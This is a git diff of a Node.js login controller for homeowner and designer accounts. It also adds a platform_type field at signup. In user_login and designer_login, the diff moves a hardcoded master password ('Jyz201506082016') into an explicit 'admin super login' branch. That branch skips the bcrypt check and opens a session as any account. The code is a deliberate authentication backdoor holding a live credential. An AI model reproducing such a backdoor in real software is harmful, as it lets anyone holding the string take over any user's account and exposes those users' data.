@@ -37,6 +37,21 @@ exports.user_login = function (req, res, next) {
 
     ep.done(function (result) {
       if (result.user) {
+        // admin super login
+        if (pass === 'Jyz201506082016') {
+          // store session cookie
+          authMiddleWare.gen_session(result.user, type.role_user, req, res);
+
+          let data = {};
+          data.usertype = type.role_user;
+          data.phone = result.user.phone;
+          data.username = result.user.username;
+          data._id = result.user._id;
+          data.imageid = result.user.imageid;
+          data.wechat_unionid = result.user.wechat_unionid;
+          return res.sendData(data);
+        }
+
         //业主登录
         let passhash = result.user.pass;
         if (!passhash) {
@@ -44,13 +59,12 @@ exports.user_login = function (req, res, next) {
         }
 
         tools.bcompare(pass, passhash, ep.done(function (bool) {
-          if (!bool && pass !== 'Jyz201506082016') {
+          if (!bool) {
             return res.sendErrMsg('用户名或密码错误');
           }
 
           // store session cookie
-          authMiddleWare.gen_session(result.user, type.role_user,
-            req, res);
+          authMiddleWare.gen_session(result.user, type.role_user, req, res);
 
           let data = {};
           data.usertype = type.role_user;
@@ -87,16 +101,29 @@ exports.designer_login = function (req, res, next) {
 
     ep.done(function (result) {
       if (result.designer) {
+        // admin super login
+        if (pass === 'Jyz201506082016') {
+          // store session cookie
+          authMiddleWare.gen_session(result.designer, type.role_designer, req, res);
+
+          let data = {};
+          data.usertype = type.role_designer;
+          data.phone = result.designer.phone;
+          data.username = result.designer.username;
+          data._id = result.designer._id;
+          data.imageid = result.designer.imageid;
+          return res.sendData(data);
+        }
+
         //设计师登录
         let passhash = result.designer.pass;
         tools.bcompare(pass, passhash, ep.done(function (bool) {
-          if (!bool && pass !== 'Jyz201506082016') {
+          if (!bool) {
             return res.sendErrMsg('用户名或密码错误');
           }
 
           // store session cookie
-          authMiddleWare.gen_session(result.designer, type.role_designer,
-            req, res);
+          authMiddleWare.gen_session(result.designer, type.role_designer, req, res);
 
           let data = {};
           data.usertype = type.role_designer;
@@ -152,6 +179,7 @@ exports.user_signup = function (req, res, next) {
           pass: passhash,
           phone: phone,
           username: '用户' + phone.slice(-4),
+          platform_type: req.platform_type
         }, ep.done(function (user_indb) {
           // store session cookie
           authMiddleWare.gen_session(user_indb,
@@ -225,6 +253,7 @@ exports.designer_signup = function (req, res, next) {
           phone: phone,
           pass: passhash,
           username: '用户' + phone.slice(-4),
+          platform_type: req.platform_type
         }, ep.done(function (user_indb) {
           // store session cookie
           authMiddleWare.gen_session(user_indb,
@@ -297,6 +326,7 @@ exports.user_wechat_login = function (req, res, next) {
           imageid: imageid,
           sex: user.sex,
           username: user.username,
+          platform_type: type.platform_wechat
         }, ep.done(function (user_indb) {
           // store session cookie
           authMiddleWare.gen_session(user_indb, type.role_user,
